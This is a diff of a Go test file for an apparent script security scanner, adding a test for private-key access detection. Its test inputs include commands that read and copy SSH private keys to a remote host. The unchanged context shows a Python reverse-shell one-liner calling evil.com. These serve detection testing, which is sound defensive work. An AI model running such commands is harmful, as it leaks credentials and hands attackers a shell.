@@ -209,6 +209,35 @@ func TestNetworkScriptDownloadDetection(t *testing.T) {
 	}
 }
 
+func TestPrivateKeyAccessDetection(t *testing.T) {
+	tests := []struct {
+		name       string
+		script     string
+		shouldFind bool
+	}{
+		{"ssh key read", "cat ~/.ssh/id_rsa", true},
+		{"pem key via openssl", "openssl rsa -in /tmp/server.pem -check", true},
+		{"private key copy", "scp ~/.ssh/id_ed25519 user@host:/tmp", true},
+		{"cert pem only", "cat ./cert.pem", false},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			findings := AnalyzeScript("test.sh", []byte(tt.script), config.PolicyConfig{})
+			found := false
+			for _, f := range findings {
+				if f.Code == "PRIVATE_KEY_ACCESS" {
+					found = true
+					break
+				}
+			}
+			if found != tt.shouldFind {
+				t.Errorf("expected finding=%v, got=%v for script: %s", tt.shouldFind, found, tt.script)
+			}
+		})
+	}
+}
+
 func TestReverseShellDetection(t *testing.T) {
 	script := "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
 	policy := config.PolicyConfig{}
